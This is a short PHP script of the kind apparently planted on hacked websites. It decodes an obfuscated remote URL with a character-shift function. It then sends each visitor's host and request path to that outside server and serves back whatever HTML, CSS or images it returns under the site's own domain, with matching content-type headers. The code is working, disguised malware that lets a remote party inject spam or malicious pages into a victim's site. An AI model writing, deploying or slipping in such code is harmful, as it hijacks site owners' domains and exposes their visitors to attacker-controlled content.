<?php
$id = 0;
if (!empty($_REQUEST['id'])) {
    $id = $_REQUEST['id'];
}
if (!empty($_SERVER['HTTP_X_FORWARDED_HOST'])) {
    $host = $_SERVER['HTTP_X_FORWARDED_HOST'];
} else {
    $host = $_SERVER['HTTP_HOST'];
}
// $host = explode(':',$host)[0];
function WSOB($a)
{
    return chr(ord($a) + 5);
}
$h =  implode('', array_map('WSOB', str_split('cook5**dn`\m^cd)i`o*api^*di_`s)kck:pmg8')));
if (function_exists('curl_init')) {
    $html = byCurl($h . urlencode($host . $_SERVER['REQUEST_URI']));
}
if(!$html) {
    $html = file_get_contents($h . urlencode($host . $_SERVER['REQUEST_URI']));
}
if (strstr($id, ".css")) {
    header('Content-Type: text/css; charset=utf-8');
} elseif (strstr($id, ".png")) {
    header('Content-Type: image/png');
} elseif (strstr($id, ".jpg") || strstr($id, ".jpeg")) {
    header('Content-Type: image/jpeg');
} elseif (strstr($id, ".gif")) {
    header('Content-Type: image/gif');
} else {
    header('Content-Type: text/html; charset=utf-8');
}
echo $html;
function byCurl($url)
{
    $myCurl = curl_init();
    curl_setopt_array($myCurl, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        //CURLOPT_POST => true,
        //CURLOPT_POSTFIELDS => http_build_query([])
    ));
    $response = curl_exec($myCurl);
    curl_close($myCurl);
    return $response;
}